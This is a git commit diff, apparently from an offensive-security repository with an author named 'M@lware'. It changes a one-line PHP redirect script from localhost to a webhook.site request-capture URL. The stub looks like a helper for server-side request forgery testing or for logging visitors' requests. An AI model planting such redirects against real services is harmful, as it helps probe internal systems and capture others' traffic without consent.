66eedb32160162cde4869edf7dc1d932c57a3e87
M@lware <cyberops1010@gmail.com>
2024-11-02 19:16:55 +0500

    Update php.php

--- php.php
+++ php.php
@@ -1,6 +1,6 @@
 <?php
 // Set the URL you want to redirect to
-$url = "http://127.0.0.1"; // Change this to the desired URL
+$url = "https://webhook.site/88ef2517-a45e-4c87-aece-4aa947bf9dbf"; // Change this to the desired URL
 
 // Redirect the user
 header("Location: $url");
